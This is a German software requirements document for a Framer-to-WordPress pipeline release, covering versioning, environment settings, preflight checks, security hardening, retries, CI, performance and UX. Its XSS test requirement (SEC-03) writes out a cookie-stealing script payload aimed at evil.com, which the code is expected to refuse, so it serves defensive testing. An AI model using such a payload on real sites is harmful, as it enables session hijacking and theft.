# Requirements — Framer V4 Pipeline Verbesserungsprojekt

## v0.7.0 — Foundation + Security

### Phase 0 — Fundament

#### Versionsdrift (VER)
- **VER-01** `package.json` version = `"0.7.0"` (aktuell `"0.6.0"`)
- **VER-02** `CHANGELOG.md` existiert mit Einträgen ab v0.6.0
- **VER-03** `SESSION-STATE.md`, `BLUEPRINT.md`, `INTEGRATION-PLAN.md` Stamps synchron
- **VER-04** Pre-commit-hook checkt `package.json` vs `CHANGELOG.md`

#### Environment (ENV)
- **ENV-01** `.env.example` enthält alle 16 Variablen (Workspace, WP/MCP, Validation, Performance)
- **ENV-02** Jede Variable hat einen dokumentierten Default-Wert
- **ENV-03** Sensitive Werte (WP_API_PASSWORD) sind leer, mit Kommentar zur Befüllung

#### CLI Preflight (CLI)
- **CLI-01** `wizard.js preflight` Subcommand existiert
- **CLI-02** Checks: .env geladen, FRAMER_EXPORT_DIR, WP_API_URL erreichbar, MCP-Discovery, V2-Plugin-Version, Schema-Endpoint, Disk-Space ≥1GB
- **CLI-03** Output: farbige ✓/✗-Tabelle, Exit-Code 0/1, `--format=json`
- **CLI-04** Preflight bricht Build ab wenn critical checks fehlschlagen

### Phase 0.5 — Security-Hardening

#### XSS Protection (SEC)
- **SEC-01** `add-custom-js` Ability: `current_user_can('unfiltered_html')` Gate (B9)
- **SEC-02** Ohne Capability: `wp_strip_all_tags()` + Allowlist-Validation
- **SEC-03** Test: `<script>document.location='evil.com?c='+document.cookie</script>` → refused

#### SAST Integration (SAST)
- **SAST-01** `psalm.xml` im Project-Root mit `--taint-analysis` Mode
- **SAST-02** Level 4 strict, alle V2-Plugin-Dateien included
- **SAST-03** Report: 0 Errors in Phase 0.5 Scope-Dateien

### Validated (bereits erledigt)

#### Security (bereits done)
- ✅ **SEC-DONE-01** XSS batch-build-page (B5) — `guard_page_js()` mit 11 Pattern-Blocklist
- ✅ **SEC-DONE-02** MIME-Spoofing media-upload (B7) — Magic-Bytes + SVG-Regex
- ✅ **SEC-DONE-03** PHP-Sandbox-Audit (B8) — `is_available()` Bug gefixt
- ✅ **SEC-DONE-04** Path-Traversal media-upload (D6) — `guard_filename()` mit Extension-Whitelist
- ✅ **SEC-DONE-05** axe-core in Visual-QA (F1) — `@axe-core/playwright` integriert

#### Integration (Session 2026-06-11)
- ✅ **INT-DONE-01** Fix A: mcp-bridge.js JSON-RPC 2.0 + Session-Handshake
- ✅ **INT-DONE-02** Fix B: asset-to-wp-media.js `--execute` Batch-Upload
- ✅ **INT-DONE-03** Fix D: check-v4-requirements.js `--auto-call` + wizard.js Fallback
- ✅ **INT-DONE-04** Fix E: generate-global-classes.js `--execute` GC-Erstellung
- ✅ **INT-DONE-05** Fix G: framer-v4-pipeline.md Cache-Regel + npm-Shortcuts
- ✅ **INT-DONE-06** Fix H: mcp-bridge.js WP REST Fallback (12 Endpoints)
- ✅ **INT-DONE-07** html-to-widget-plan.js — Brücke zu adrians-html-to-elementor-widget-plan

#### Bugfixes
- ✅ **BUGFIX-01** Windows ESM: `pathToFileURL()` in pipeline.test.js
- ✅ **BUGFIX-02** Schema-Fixture: `schemas/v4-prop-type-schema.json`
- ✅ **BUGFIX-03** e2e.test.js Check-Count 6→7

### Phase 1 — Reliability

#### Retry & Error-Handling (RET)
- **RET-01** `mcp-client.js` mit `executeAbility(name, args, { maxRetries, baseDelayMs })`
- **RET-02** Nur retryable Errors (5xx, Timeout), 4xx = no retry
- **RET-03** Delay: `baseDelayMs * 2^attempt + random(0, 200)` (Jitter)

#### Error-Katalog (ERR)
- **ERR-01** 12 Guards in `framer-pre-build-validate.js`: strukturierter Output (`code`, `severity`, `message`, `fixHint`, `autoFixable`)
- **ERR-02** `npm run validate -- --autofix` führt auto-fixable Items aus
- **ERR-03** `qa-report.json` aggregiert nach `code` statt anonymen Errors

#### CI (CI)
- **CI-01** `.github/workflows/ci.yml`: Jobs `test`, `test:schema`, `test:mcp-mock`, `test:visual`
- **CI-02** `tests/mcp-mock-server.js`: lokaler Mock mit 109 Abilities
- **CI-03** Tests laufen auf Ubuntu ohne Live-WP

### Phase 2 — Performance

#### Batched Calls (BATCH)
- **BATCH-01** `batch-build-page` Ability im V2-Plugin (30 Widgets in 1 Call)
- **BATCH-02** Pipeline: Batch-Mode für Build-Phase (Speedup: 20-50x)

#### Parallel Execution (PAR)
- **PAR-01** `scripts/parallel-pre-build.js`: 5 Sub-Steps via `Promise.allSettled`
- **PAR-02** Speedup: Phase 2 ~5 Min → ~1.5 Min

#### Discovery Cache (CACHE)
- **CACHE-01** `scripts/lib/mcp-cache.js`: `.pipeline/mcp-discovery.json`, TTL via env
- **CACHE-02** Invalidate: `--refresh-cache` oder URL-Change

### Phase 3 — UX & DX

#### Dry-Run (DRY)
- **DRY-01** `wizard.js build --dry-run`: generiert Plan, schreibt NICHT
- **DRY-02** Diff-Anzeige zum Live-Stand

#### Preview & Promote (PREV)
- **PREV-01** `wizard.js preview`: Preview-Page mit `-preview-{hash}` Suffix
- **PREV-02** `wizard.js promote`: Preview → Live-Page

#### Progress & Errors (PROG)
- **PROG-01** Schritt-für-Schritt Progress mit ✓/✗/⠋
- **PROG-02** Fehler-Prompt: `[R]etry [S]kip [F]ix-manually [A]bort`
- **PROG-03** Actionable Error Messages mit `.pipeline/error-context.json`

## Out of Scope (v0.7.0)

| Excluded | Reason |
|---|---|
| Phase 4 (Pipeline-as-a-Service) | Deferred auf v0.8.0 |
| Phase 4.2-4.6 (Versioning, Multi-Site, Feedback, Mega-Ability, Token-Auth) | Deferred auf v0.8.0 |
| Phase 5.1 (WCAG 2.2 A11y-Migration) | Deferred auf v0.8.0 |
| Wild Ideas W1-W12 | Zukunftsmusik |

## Traceability

| Req | Phase | Status |
|---|---|---|
| VER-01..04 | 0 | open |
| ENV-01..03 | 0 | open |
| CLI-01..04 | 0 | open |
| SEC-01..03 | 0.5 | open |
| SAST-01..03 | 0.5 | open |
| RET-01..03 | 1 | open |
| ERR-01..03 | 1 | open |
| CI-01..03 | 1 | open |
| BATCH-01..02 | 2 | open |
| PAR-01..02 | 2 | open |
| CACHE-01..02 | 2 | open |
| DRY-01..02 | 3 | open |
| PREV-01..02 | 3 | open |
| PROG-01..03 | 3 | open |
